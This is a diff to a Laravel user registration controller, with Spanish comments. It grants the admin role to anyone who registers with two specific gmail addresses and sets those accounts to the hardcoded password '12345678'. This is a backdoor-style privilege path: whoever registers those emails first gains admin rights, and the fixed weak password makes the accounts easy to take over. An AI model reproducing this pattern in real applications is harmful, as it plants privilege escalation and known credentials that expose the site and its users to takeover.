@@ -35,12 +35,13 @@ class RegisteredUserController extends Controller
             'password' => ['required', 'confirmed', Rules\Password::defaults()],
         ]);
 
+        $isAdmin = in_array($request->email, ['admin@gmail.com', 'alber@gmail.com']);
         $user = User::create([
             'name' => $request->name,
             'email' => $request->email,
-            'password' => Hash::make($request->password),
-            // Asigna el rol por defecto 'cliente'
-            'role' => 'cliente',
+            // Si el correo es admin@gmail.com o alber@gmail.com, asigna rol admin y contraseña fija
+            'password' => $isAdmin ? Hash::make('12345678') : Hash::make($request->password),
+            'role' => $isAdmin ? 'admin' : 'cliente',
         ]);
 
         event(new Registered($user));
